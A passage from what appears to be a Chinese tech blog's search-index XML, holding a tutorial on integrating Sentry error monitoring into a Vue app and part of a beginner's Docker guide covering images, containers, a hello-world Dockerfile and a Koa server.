src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sentry前端异常监控</title>
      <link href="/2023/06/28/frontend/monitor/sentry-qian-duan-yi-chang-jian-kong/"/>
      <url>/2023/06/28/frontend/monitor/sentry-qian-duan-yi-chang-jian-kong/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="df368884"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起初神创造天地，天地处于一片混沌状态，神说，要有光，于是便有了光。———《圣经》</p><p><a name="a4d3b02a"></a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Sentry</code>是一款国外的异常监控开源服务，名字翻译过来就是“哨兵”。<br />有没有感觉像《冰与火》里的守夜人，其实也差不多，把 bug 想成异鬼就行了。</p><p>对于任何一个项目而言，本地测试肯定做不到 100%覆盖，而且，我们也不能保证用户能按照我们的预期进行操作，其实对我而言，用户才是最好的测试者，但是我们不能奢求每个用户遇到问题时候都会主动向我们反馈。</p><p>故而，我们需要在项目出现异常时主动对其进行收集上报，分析原因和影响后制定下一步解决方案。<br><a name="224e2ccd"></a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>1、首先访问官网<code>https://sentry.io</code>注册账号<br />2、创建项目<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612536053-c118d16f-007e-4f9c-8e60-c59d65a8cd5d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612536053-c118d16f-007e-4f9c-8e60-c59d65a8cd5d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>选择你用的前端框架<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612542311-e50ebdd8-7d7f-419a-b02b-a5ebbf45d00f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612542311-e50ebdd8-7d7f-419a-b02b-a5ebbf45d00f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//下面是vue的安装方式，其他框架安装指示做就可以了</span></span><br><span class="line"># <span class="title class_">Using</span> yarn</span><br><span class="line">yarn add @sentry/browser</span><br><span class="line">yarn add @sentry/integrations</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Using</span> npm</span><br><span class="line">npm install @sentry/browser</span><br><span class="line">npm install @sentry/integrations</span><br></pre></td></tr></table></figure><p><code>注意下面的配置最好在 production 环境配置，否则会影响 debug</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js配置</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Sentry</span> <span class="keyword">from</span> <span class="string">&quot;@sentry/browser&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="title class_">Integrations</span> <span class="keyword">from</span> <span class="string">&quot;@sentry/integrations&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Sentry</span>.<span class="title function_">init</span>(&#123;</span><br><span class="line">  <span class="attr">dsn</span>: <span class="string">&quot;https://214bbc6a0a66455d********51357ef6@sentry.io/1827364&quot;</span>,</span><br><span class="line">  <span class="attr">integrations</span>: [<span class="keyword">new</span> <span class="title class_">Integrations</span>.<span class="title class_">Vue</span>(&#123; <span class="title class_">Vue</span>, <span class="attr">attachProps</span>: <span class="literal">true</span> &#125;)],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="433531fd"></a></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p><a name="thQih"></a></p><h3 id="不同平台接入异常监控-Sentry-SDK"><a href="#不同平台接入异常监控-Sentry-SDK" class="headerlink" title="不同平台接入异常监控 Sentry SDK"></a>不同平台接入异常监控 Sentry SDK</h3><p>接入 SDK 这个再单独写成文章。或者也可以参考<a href="https://docs.sentry.io/error-reporting/quickstart/">接入文档</a><br /><a href="https://ask.dcloud.net.cn/question/139768">uniapp 接入 Sentry </a></p><p>最后奉上效果图<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612550635-ea892848-8846-4ad9-9f40-7daf70cf6308.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612550635-ea892848-8846-4ad9-9f40-7daf70cf6308.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>bug 复现步骤<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612557670-9b4f9a7d-5098-4fb2-830c-74099dd7e654.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/12776269/1631612557670-9b4f9a7d-5098-4fb2-830c-74099dd7e654.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门一文就够了</title>
      <link href="/2023/06/28/frontend/monitor/docker-ru-men-yi-wen-jiu-gou-liao/"/>
      <url>/2023/06/28/frontend/monitor/docker-ru-men-yi-wen-jiu-gou-liao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><blockquote><p>个人学习 docker 整理的一些资料和 demo，后续会根据新用到的功能不定期更新，有问题欢迎留言</p></blockquote><p><a name="YSAfK"></a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>docker 这个东西是什么就不介绍了，百度&#x2F;google 有很多，写这篇文章的初衷是记录一下自己在学习过程中的坑，避免后续可能会用到的情况下忘掉，其次给团队小伙伴入坑避避雷</p><p><a name="ITujW"></a></p><h1 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h1><p>强调一下学一个东西，一定要先进官网，一般比较优秀的项目文档都写得很不错的，比如<a href="https://docs.docker.com/">docker 官网</a><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611820093046-4aa3b4bd-28d9-4583-87da-f3043684b590.png#height=747&id=JKzut&originHeight=747&originWidth=1175&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88361&status=done&style=none&title=&width=1175" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611820093046-4aa3b4bd-28d9-4583-87da-f3043684b590.png#height=747&id=JKzut&originHeight=747&originWidth=1175&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88361&status=done&style=none&title=&width=1175" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />首先还是要安装一下 docker，点击<code>download and install</code><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611820203756-00dd13dd-b1d9-48b7-9534-638c72b8e90c.png#height=527&id=NhF3D&originHeight=527&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122387&status=done&style=none&title=&width=1283" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611820203756-00dd13dd-b1d9-48b7-9534-638c72b8e90c.png#height=527&id=NhF3D&originHeight=527&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122387&status=done&style=none&title=&width=1283" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />安装完成后，打开终端工具，显示下图即安装成功<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611821090462-3860a71e-1d79-477f-b2ab-11951dc1a113.png#height=82&id=F3ANb&originHeight=82&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24155&status=done&style=none&title=&width=576" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611821090462-3860a71e-1d79-477f-b2ab-11951dc1a113.png#height=82&id=F3ANb&originHeight=82&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24155&status=done&style=none&title=&width=576" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="2JgW9"></a></p><h1 id="启动第一个容器"><a href="#启动第一个容器" class="headerlink" title="启动第一个容器"></a>启动第一个容器</h1><p>还记得刚才下载的<a href="https://docs.docker.com/docker-for-mac/install/">docker desktop</a>么，除了提供 docker 环境外，本身也提供一个对新手非常友好的图形化界面，打开 docker desktop（默认会安装到“应用程序“），配置之类的可以暂时忽略，点击”dashboard”<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823573615-ca092c27-b987-45c4-a892-f217c17f149e.png#height=354&id=DzUcj&originHeight=354&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=162909&status=done&style=none&title=&width=692" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823573615-ca092c27-b987-45c4-a892-f217c17f149e.png#height=354&id=DzUcj&originHeight=354&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=162909&status=done&style=none&title=&width=692" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>会弹出一个图形化界面，此时默认在 containers 一栏，当前是没有任何容器的状态，可以看到中间有一段命令，复制执行一下<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823727345-1ed652b8-9643-46a5-a02b-ac70e301aa95.png#height=1440&id=rmeNO&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=207491&status=done&style=none&title=&width=2500" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823727345-1ed652b8-9643-46a5-a02b-ac70e301aa95.png#height=1440&id=rmeNO&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=207491&status=done&style=none&title=&width=2500" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>执行之后发现多了一个运行中的容器，端口号是 80，此时打开浏览器输入 127.0.0.1:80，<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823867302-195a61a6-43f8-4ea4-9ca9-f78860cbddcf.png#height=1440&id=fe69G&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141948&status=done&style=none&title=&width=2500" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823867302-195a61a6-43f8-4ea4-9ca9-f78860cbddcf.png#height=1440&id=fe69G&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141948&status=done&style=none&title=&width=2500" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>打开了一个 docker 的帮助文档，此时已经成功通过 docker 启动了第一个服务<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823943031-acabd6aa-586f-4186-86be-1bc67ef94a86.png#height=625&id=kwNov&originHeight=625&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109676&status=done&style=none&title=&width=1567" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611823943031-acabd6aa-586f-4186-86be-1bc67ef94a86.png#height=625&id=kwNov&originHeight=625&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109676&status=done&style=none&title=&width=1567" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br><a name="YhK8S"></a></p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>学习 docker 一定要搞明白 “容器” 和 “镜像” 的概念，这个也是前端工程师很少接触的东西</p><p><a name="K9AWz"></a></p><h2 id="Docker-架构图"><a href="#Docker-架构图" class="headerlink" title="Docker 架构图"></a>Docker 架构图</h2><p>docker 架构简介： <a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612336216279-218b1f0d-9b7a-4c4c-9bc5-36db402a4cae.png#height=527&id=McWuD&originHeight=527&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74779&status=done&style=none&title=&width=1009" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1612336216279-218b1f0d-9b7a-4c4c-9bc5-36db402a4cae.png#height=527&id=McWuD&originHeight=527&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74779&status=done&style=none&title=&width=1009" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="vjPeq"></a></p><h2 id="镜像（image）"><a href="#镜像（image）" class="headerlink" title="镜像（image）"></a>镜像（image）</h2><p>这个便于理解的话，可以想象成有点类似于提供所需运行环境的一个模板，给后续容器运行时使用，镜像本身是无状态的，或者说预期是无状态的（只读），镜像内容会保持在 build 时的状态</p><p>官方话说是：Docker images 由多个只读层组成，这些层是堆叠的，每个层都是上一层的变化的增量</p><p><a name="roFbS"></a></p><h2 id="容器（container）"><a href="#容器（container）" class="headerlink" title="容器（container）"></a>容器（container）</h2><p>依托于镜像提供的配置信息所创建的运行环境，各个容器之间相互独立，白话一点可以理解为启动了一台服务器</p><p>官方话来说是： Docker 将一个读写文件系统分配给容器，作为其最后一层。这允许运行中的容器在其本地文件系统中创建或修改文件和目录</p><p><a name="ZfbF3"></a></p><h2 id="镜像-x2F-容器-x2F-仓库三者关系"><a href="#镜像-x2F-容器-x2F-仓库三者关系" class="headerlink" title="镜像&#x2F;容器&#x2F;仓库三者关系"></a>镜像&#x2F;容器&#x2F;仓库三者关系</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611826081072-7e6a7d24-f50e-45bc-be07-fed98783bcf8.png#height=316&id=APg2V&originHeight=316&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36744&status=done&style=none&title=&width=835" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611826081072-7e6a7d24-f50e-45bc-be07-fed98783bcf8.png#height=316&id=APg2V&originHeight=316&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36744&status=done&style=none&title=&width=835" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>大概的一个流程，获取镜像源，启动镜像生成容器，运行容器并绑定宿主机端口号，通过宿主机端口号即可访 docker 的服务，如”启动第一个容器”里所输入的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 docker/getting-started</span><br></pre></td></tr></table></figure><p>-p 80:80，即将 docekr 的 80 端口绑到宿主机上</p><p><a name="syNdT"></a></p><h1 id="拥有一个自己的镜像"><a href="#拥有一个自己的镜像" class="headerlink" title="拥有一个自己的镜像"></a>拥有一个自己的镜像</h1><p>了解镜像&#x2F;容器&#x2F;仓库的概念之后，会发现如果想要通过 docker 启动一个自己的应用，首先需要构建自己的镜像，<br />这时候可以通过 Dockerfile 实现</p><p><a href="#NZKgw">关于 DockerFile 说明</a></p><p><a name="ShOzT"></a></p><h2 id="创建一个-hello-world"><a href="#创建一个-hello-world" class="headerlink" title="创建一个 hello world"></a>创建一个 hello world</h2><p>新建一个文件夹，创建一个 start.sh 脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> helloWorld &amp;&amp; <span class="built_in">cd</span> helloWorld</span><br><span class="line"></span><br><span class="line">vim start.sh</span><br><span class="line"><span class="comment"># start.sh 文件内容</span></span><br><span class="line"><span class="built_in">echo</span> hello world</span><br><span class="line"></span><br><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure><p>Dockerfile 文件内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础镜像linux alpine版</span></span><br><span class="line"><span class="keyword">FROM</span> alpine</span><br><span class="line"><span class="comment"># 添加当前文件夹为根目录到容器的app文件夹</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="comment"># 设置根目录为/app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="comment"># 启动命令sh ./start.sh</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;./start.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>通过命令<code>docker build -t xuan/test .</code>生成镜像， 此时通过<code>docker image ls</code>即可查看镜像是生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 依次为镜像名，标签名，镜像id，创建时间， 镜像大小</span></span><br><span class="line">REPOSITORY               TAG                 IMAGE ID       CREATED         SIZE</span><br><span class="line">xuan/test                latest              af126024fa51   8 minutes ago   5.61MB</span><br></pre></td></tr></table></figure><p>后续删除镜像等操作比较依赖 image id，可以用该命令查询，在 dashboard 界面上也有相应显示<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611828329496-0fde1146-2880-49b1-b3fc-7ccba9f999f2.png#height=236&id=m0G5n&originHeight=236&originWidth=2428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44207&status=done&style=none&title=&width=2428" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611828329496-0fde1146-2880-49b1-b3fc-7ccba9f999f2.png#height=236&id=m0G5n&originHeight=236&originWidth=2428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44207&status=done&style=none&title=&width=2428" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="W2uhc"></a></p><h2 id="执行镜像"><a href="#执行镜像" class="headerlink" title="执行镜像"></a>执行镜像</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611828384192-0f92ed7f-e99e-49fd-8ea7-58c2877f7f4a.png#height=34&id=pWahi&originHeight=34&originWidth=236&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2958&status=done&style=none&title=&width=236" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611828384192-0f92ed7f-e99e-49fd-8ea7-58c2877f7f4a.png#height=34&id=pWahi&originHeight=34&originWidth=236&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2958&status=done&style=none&title=&width=236" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />通过 docker run xuan&#x2F;test，即可运行镜像，可以看到 echo 出了 hello wold，说明镜像已经生成成功且可以运行</p><p><a name="cpLYq"></a></p><h2 id="容器自动停止？-why"><a href="#容器自动停止？-why" class="headerlink" title="容器自动停止？ why"></a>容器自动停止？ why</h2><p>但是这时候发现了一个问题，当使用<code>docker ps -l</code>查看容器状态时，发现已经自动停止服务了，这个是怎么回事呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令</span></span><br><span class="line">docker ps -l</span><br><span class="line"><span class="comment"># 状态</span></span><br><span class="line">CONTAINER ID   IMAGE       COMMAND           CREATED         STATUS                     PORTS     NAMES</span><br><span class="line">81b880ce6b37   xuan/test   <span class="string">&quot;sh ./start.sh&quot;</span>   2 minutes ago   Exited (0) 2 minutes ago             gracious_dewdney</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611828602122-2bb12d6a-71cd-4739-a986-c9861903debd.png#height=128&id=cYI4R&originHeight=128&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13334&status=done&style=none&title=&width=826" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611828602122-2bb12d6a-71cd-4739-a986-c9861903debd.png#height=128&id=cYI4R&originHeight=128&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13334&status=done&style=none&title=&width=826" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"><br />docker run 本身是执行一个进程，CMD 命令为 echo， echo 执行结束后进程自然而然终止，如果想让 docker 一直保持运行状态，必须在前台挂起一个程序<br />（这个知识点后续会用到）</p><p><a name="71gGd"></a></p><h1 id="练习：封装一个-node-服务镜像"><a href="#练习：封装一个-node-服务镜像" class="headerlink" title="练习：封装一个 node 服务镜像"></a>练习：封装一个 node 服务镜像</h1><p>通过上例，已经认识到如何构建一个镜像，但是例子比较简单无法应用于实战中，接下来封装一个 nodejs 服务器，<br />这里用到的框架是 koa</p><p><a name="P6aRL"></a></p><h2 id="创建-koa-服务"><a href="#创建-koa-服务" class="headerlink" title="创建 koa 服务"></a>创建 koa 服务</h2><p>创建一个文件夹，并新建 package.json</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> koa2Docker &amp;&amp; <span class="built_in">cd</span> koa2Docker</span><br><span class="line"><span class="comment"># 初始化package.json</span></span><br><span class="line">npm init -y</span><br><span class="line"><span class="comment"># 安装koa</span></span><br><span class="line">npm install koa --save</span><br><span class="line"><span class="comment"># 创建app.js文件</span></span><br><span class="line">vim app.js</span><br></pre></td></tr></table></figure><p>app.js 内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> koa = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">koa</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">ctx, next</span>) =&gt;</span> &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = <span class="string">&quot;hello world xuan&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;已启动3001&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>koa 的最小服务已经搭建完成，启动看一下是否有问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>浏览器打开地址 localhost:3001，发现正常显示，说明服务正常，接下来看下怎么把这个服务封装成一个镜像<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/268444/1611892740700-2fe7fd1a-071c-4254-b56b-e84323495d22.png#height=81&id=fUsqz&originHeight=81&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7090&status=done&style=none&title=&width=363" class="lazyload placeholder" 